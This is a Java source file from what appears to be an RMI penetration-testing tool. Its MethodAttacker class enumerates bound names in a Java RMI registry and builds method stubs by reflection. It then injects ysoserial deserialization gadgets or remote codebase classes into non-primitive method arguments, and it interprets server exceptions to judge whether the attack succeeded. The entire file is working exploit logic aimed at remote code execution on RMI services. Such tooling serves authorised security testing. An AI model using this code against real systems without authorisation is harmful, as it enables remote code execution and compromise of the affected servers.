package de.qtc.rmg.operations;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.RMGUtils;
import javassist.CannotCompileException;
import javassist.NotFoundException;

public class MethodAttacker {

    private RMIWhisperer rmi;
    private HashMap<String,String> classes;
    private MethodCandidate targetMethod;

    private Field proxyField;
    private Field remoteField;

    public MethodAttacker(RMIWhisperer rmiRegistry, HashMap<String,String> classes, MethodCandidate targetMethod)
    {
        this.rmi = rmiRegistry;
        this.classes = classes;
        this.targetMethod = targetMethod;

        try {
            this.proxyField = Proxy.class.getDeclaredField("h");
            this.remoteField = RemoteObject.class.getDeclaredField("ref");
            proxyField.setAccessible(true);
            remoteField.setAccessible(true);

        } catch(NoSuchFieldException | SecurityException e) {
            ExceptionHandler.unexpectedException(e, "MethodAttacker", "instantiation", true);
        }
    }

    @SuppressWarnings({ "rawtypes", "deprecation" })
    public void attack(Object gadget, String boundName, int argumentPosition, String operationMode, int legacyMode)
    {
        String methodName = "";
        boolean isCodebaseCall = operationMode.equals("codebase");

        try {
            methodName = this.targetMethod.getName();
        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "compliation", "process", true);
        }

        if(isCodebaseCall)
            Logger.printCodebaseAttackIntro("RMI", methodName, gadget.getClass().getName());
        else
            Logger.printGadgetCallIntro("RMI");

        if( boundName != null )
            Logger.printlnMixedBlue("Target name specified. Only attacking bound name:", boundName);
        else
            Logger.printlnMixedBlue("No target name specified. Attacking", "all", "available bound names.");

        Logger.println("");

        Iterator<Entry<String, String>> it = this.classes.entrySet().iterator();
        while (it.hasNext()) {

            Map.Entry pair = (Map.Entry)it.next();
            String name = (String)pair.getKey();
            String className = (String)pair.getValue();

            if( boundName != null && !boundName.equals(name) ) {
                continue;
            }

            Logger.printlnMixedYellow("Current bound name:", name);
            Logger.increaseIndent();

            int attackArgument = 0;
            try {
                attackArgument = this.targetMethod.getPrimitive(argumentPosition);
            } catch (CannotCompileException | NotFoundException e) {
                ExceptionHandler.unexpectedException(e, "search", "for primitive types", true);
            }

            if( attackArgument == -1 ) {

                if( argumentPosition == -1 )
                    Logger.eprintlnMixedYellow("No non primitive arguments were found for method signature", this.targetMethod.getSignature());

                RMGUtils.exit();
            }

            Logger.printlnMixedYellow("Found non primitive argument type on position", String.valueOf(attackArgument));
            boolean isLegacy = RMGUtils.isLegacy(className, legacyMode, true);

            Remote instance = null;
            Class remoteClass = null;
            RemoteRef remoteRef = null;

            try {

                if( !isLegacy )
                    remoteClass = RMGUtils.makeInterface(className, this.targetMethod);

                else
                    remoteClass = RMGUtils.makeLegacyStub(className, this.targetMethod);

            } catch(CannotCompileException e) {
                ExceptionHandler.cannotCompile(e, "interface", "creation", false);
                Logger.decreaseIndent();
                continue;
            }

            try {
                instance = rmi.getRegistry().lookup(name);

                if( !isLegacy ) {
                    RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler)proxyField.get(instance);
                    remoteRef = ref.getRef();

                } else {
                    remoteRef = (RemoteRef)remoteField.get(instance);
                }

            } catch( Exception e ) {
                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
                Logger.decreaseIndent();
                continue;
            }

            Method[] allMethods = remoteClass.getDeclaredMethods();
            Method attackMethod = allMethods[0];
            Object[] methodArguments = RMGUtils.getArgumentArray(attackMethod);

            Object[] payloadArray = new Object[2];
            Object randomInstance = null;

            try {
                Class randomClass = RMGUtils.makeRandomClass();
                randomInstance = randomClass.newInstance();

            } catch (Exception e) {
                ExceptionHandler.unexpectedException(e, "random class", "creation", false);
                Logger.decreaseIndent();
                continue;
            }

            payloadArray[0] = gadget;
            payloadArray[1] = randomInstance;
            methodArguments[attackArgument] = payloadArray;

            try {
                Logger.println("Invoking remote method...");
                Logger.println("");
                Logger.increaseIndent();

                rmi.genericCall(null, -1, this.targetMethod.getHash(), methodArguments, isCodebaseCall, methodName, remoteRef);

                Logger.eprintln("Remote method invocation didn't cause any exception.");
                Logger.eprintln("This is unusual and the attack probably didn't work.");

            } catch (java.rmi.ServerException e) {

                Throwable cause = ExceptionHandler.getCause(e);
                if( cause instanceof java.rmi.UnmarshalException ) {
                    Logger.eprintlnMixedYellow("Method", this.targetMethod.getSignature(), "does not exist on this bound name.");
                    ExceptionHandler.showStackTrace(e);
                    continue;

                } else if( cause instanceof java.lang.ClassNotFoundException ) {

                    String exceptionMessage = e.getMessage();
                    String randomClassName = randomInstance.getClass().getName();

                    if( operationMode.equals("ysoserial") ) {

                        if( exceptionMessage.contains(randomClassName) ) {
                            ExceptionHandler.deserializeClassNotFoundRandom(e, "deserialization", "attack", randomClassName);

                        } else {
                            ExceptionHandler.deserializeClassNotFound(e);
                        }
                    }

                    else if( operationMode.equals("codebase") ) {

                        if( exceptionMessage.contains("RMI class loader disabled") ) {
                            ExceptionHandler.codebaseSecurityManager(e);
                        }

                        else if( exceptionMessage.contains(gadget.getClass().getName()) ) {
                            ExceptionHandler.codebaseClassNotFound(e, gadget.getClass().getName());
                        }

                        else if( exceptionMessage.contains(randomClassName) ) {
                            ExceptionHandler.codebaseClassNotFoundRandom(e, randomClassName, gadget.getClass().getName());

                        } else {
                            ExceptionHandler.unexpectedException(e, "codebase", "attack", false);
                        }
                    }

                } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                    ExceptionHandler.unsupportedClassVersion(e, operationMode, "attack");

                } else if( cause instanceof java.security.AccessControlException ) {
                    ExceptionHandler.accessControl(e, operationMode, "attack");

                } else {
                    ExceptionHandler.unexpectedException(e, operationMode, "attack", false);
                }

            } catch( java.lang.ClassCastException e ) {

                if( operationMode.equals("ysoserial") )
                    ExceptionHandler.deserlializeClassCast(e, true);
                else
                    ExceptionHandler.codebaseClassCast(e, true);

            } catch( java.security.AccessControlException e ) {
                ExceptionHandler.accessControl(e, operationMode, "attack");

            } catch( java.rmi.UnmarshalException e ) {

                Throwable t = ExceptionHandler.getCause(e);
                if( t instanceof java.lang.ClassNotFoundException ) {
                    Logger.eprintlnMixedYellow("Caught local", "ClassNotFoundException", "during " + operationMode + " attack.");
                    Logger.eprintlnMixedBlue("This usually occurs when the", "gadget caused an exception", "on the server side.");
                    Logger.printlnMixedYellow("You probably entered entered an", "invalid command", "for the gadget.");
                    ExceptionHandler.showStackTrace(e);

                } else {
                    ExceptionHandler.unexpectedException(e, operationMode, "attack", false);
                }

            } catch( Exception e ) {

                if(operationMode.equals("ysoserial"))
                    ExceptionHandler.unknownDeserializationException(e);
                else
                    ExceptionHandler.unexpectedException(e, operationMode, "attack", false);

            } finally {
                Logger.decreaseIndent();
                Logger.decreaseIndent();

                if(it.hasNext())
                    Logger.println("");
            }
        }
    }
}
